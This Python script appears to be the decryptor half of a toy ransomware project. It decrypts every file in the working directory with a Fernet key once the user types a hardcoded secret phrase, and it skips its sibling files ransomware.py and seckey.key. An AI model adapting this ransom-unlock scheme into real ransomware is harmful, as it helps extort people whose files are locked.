# decrypt.py (Decryption)

import os
from cryptography.fernet import Fernet

def decrypt_files(directory="."):
    """Decrypts all files in the given directory."""
    files = []
    for file in os.listdir(directory):
        if file == 'ransomware.py' or file == 'seckey.key' or file == 'decrypt.py':
            continue
        filepath = os.path.join(directory, file)
        if os.path.isfile(filepath):
            files.append(filepath)

    if not files:
        print("No files to decrypt.")
        return

    try:
        with open("seckey.key", "rb") as k:
            secret_key = k.read()
    except FileNotFoundError:
        print("Key file not found. Decryption impossible.")
        return

    secret_phrase = "Radhika"
    user_entities = input("Enter the secret code to decrypt your files: ")

    if user_entities == secret_phrase:
        for file in files:
            try:
                with open(file, 'rb') as theFile:
                    content = theFile.read()
                decrypted_content = Fernet(secret_key).decrypt(content)

                with open(file, 'wb') as theFile:
                    theFile.write(decrypted_content)
                print(f"Decrypted {file}")

            except Exception as e:
                print(f"Error decrypting {file}: {e}")

        print("Decryption complete.")
    else:
        print("Incorrect secret code. Decryption failed.")

if __name__ == "__main__":
    decrypt_files()